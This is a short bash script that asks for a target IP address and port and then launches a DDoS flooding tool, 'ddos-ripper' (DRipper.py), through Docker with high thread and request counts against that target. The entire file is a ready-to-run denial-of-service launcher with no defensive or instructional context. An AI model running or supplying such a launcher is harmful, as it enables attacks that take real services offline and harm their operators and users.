#!/bin/bash

read -p 'IP:' IP
read -p 'Port:' Port

sudo docker run --rm -it --entrypoint=python nitupkcuf/ddos-ripper DRipper.py -s $IP -p $Port -t 135  -q 10000